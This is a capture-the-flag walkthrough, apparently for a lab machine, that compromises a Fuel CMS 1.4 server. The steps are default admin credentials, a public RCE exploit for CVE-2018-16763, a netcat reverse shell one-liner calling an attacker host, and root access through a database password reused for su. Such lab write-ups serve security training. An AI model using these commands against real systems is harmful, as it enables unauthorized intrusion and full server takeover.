# Ignite

## Step 1: Reconnaissance

Run an Nmap scan to identify open ports and services:

```bash
nmap -sV -sC <MACHINE_IP>
```

**Results:**

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry
|_/fuel/
|_http-title: Welcome to FUEL CMS
```

Only port 80 is open, running **Fuel CMS** on Apache. The `robots.txt` file already hints at the `/fuel/` admin path.

---

## Step 2: Admin Login

Navigate to `http://<MACHINE_IP>/fuel` — it redirects to the login page at `/fuel/login/`.

Log in with the default credentials:

- **Username:** `admin`
- **Password:** `admin`

---

## Step 3: Finding an Exploit

Search for known vulnerabilities for Fuel CMS 1.4:

```bash
searchsploit fuel cms 1.4
```

**Results:**

```
Exploit Title                                                |  Path
------------------------------------------------------------- ---------------------------------
fuel CMS 1.4.1 - Remote Code Execution (1)                   | linux/webapps/47138.py
Fuel CMS 1.4.1 - Remote Code Execution (2)                   | php/webapps/49487.rb
Fuel CMS 1.4.1 - Remote Code Execution (3)                   | php/webapps/50477.py
Fuel CMS 1.4.13 - 'col' Blind SQL Injection (Authenticated)  | php/webapps/50523.txt
Fuel CMS 1.4.7 - 'col' SQL Injection (Authenticated)         | php/webapps/48741.txt
Fuel CMS 1.4.8 - 'fuel_replace_id' SQL Injection (Authen...) | php/webapps/48778.txt
```

Download exploit `50477.py` (CVE-2018-16763):

```bash
searchsploit -m 50477
```

Edit the script and set the target URL to `http://<MACHINE_IP>`.

---

## Step 4: Getting a Reverse Shell

**Terminal 1** — Start a listener:

```bash
nc -lvnp 4444
```

**Terminal 2** — Run the exploit:

```bash
python3 50477.py -u http://<MACHINE_IP>
```

When prompted for a command, send the reverse shell payload:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f
```

You should now have a shell on your listener.

---

## Step 5: Finding Database Credentials

Navigate to the Fuel CMS config directory and read `database.php`:

```bash
cd /var/www/html/fuel/application/config
cat database.php
```

Look for the credentials block:

```php
$db['default'] = array(
    'hostname' => 'localhost',
    'username' => 'root',
    'password' => 'mememe',
    'database' => 'fuel_schema',
    ...
);
```

> **DB Password:** `mememe`

---

## Step 6: Privilege Escalation to Root

Attempting `su root` directly may fail with:

```
su: must be run from a terminal
```

Upgrade to a proper TTY first:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then switch to root using the password found above:

```bash
su root
# Password: mememe
```

---

## Step 7: Capture the Flags

```bash
cat /home/www-data/flag.txt   # User flag
cat /root/root.txt            # Root flag
```

---

## Summary

| Step | Action |
|------|--------|
| Recon | Nmap reveals Fuel CMS on port 80 |
| Login | Default creds `admin:admin` work |
| Exploit | CVE-2018-16763 RCE via exploit 50477.py |
| Shell | Reverse shell via netcat |
| Creds | DB password `mememe` found in `database.php` |
| Root | TTY upgrade → `su root` with DB password |
| Flags | User and root flags captured |
